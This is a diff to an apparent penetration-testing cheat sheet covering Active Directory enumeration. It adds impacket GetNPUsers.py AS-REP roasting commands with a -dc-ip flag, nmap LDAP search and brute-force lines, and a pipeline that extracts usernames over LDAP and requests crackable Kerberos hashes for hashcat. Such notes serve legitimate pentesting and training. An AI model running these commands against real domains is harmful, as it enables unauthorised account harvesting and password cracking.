@@ -114,8 +114,8 @@ Find accounts with enum4linux, crackmapexec, ldapsearch, other sources..
 Accounts but no pass
 Note: this only works is pre-auth is disabled
 1) Add the domain name to /etc/hosts
-2) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt
-3) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/USER -no-pass
+2) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/ -dc-ip INSERTIPADDRESS -no-pass -usersfile users.txt
+3) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/USER -dc-ip INSERTIPADDRESS -no-pass
 Note: these hashes will be in -m 18200 (Kerberos 5 AS-REP etype 23) in hashcat
 
 Accounts and pass
@@ -221,8 +221,14 @@ INSERTLDAPSCAN
 ```
 Will change depending on binding mode, with anonymous binding though...
 
-nmap -p 389 --script ldap-search INSERTIPADDRESS
+nmap -p 389 --script ldap-search --script-args ldap.maxobjects=-1 INSERTIPADDRESS
 nmap -p 389 --script ldap-brute INSERTIPADDRESS
+
+Look for pwdLastSet: Never
+
+To get usernames to request for Kerberos
+nmap -p 389 -Pn  --script ldap-search --script-args ldap.maxobjects=-1 INSERTIPADDRESS | grep sAMAccountName | cut -d":" -f 2 > users.txt
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/ -dc-ip INSERTIPADDRESS -no-pass -usersfile users.txt 
 ```
 
 ### Port 443 - HTTPS
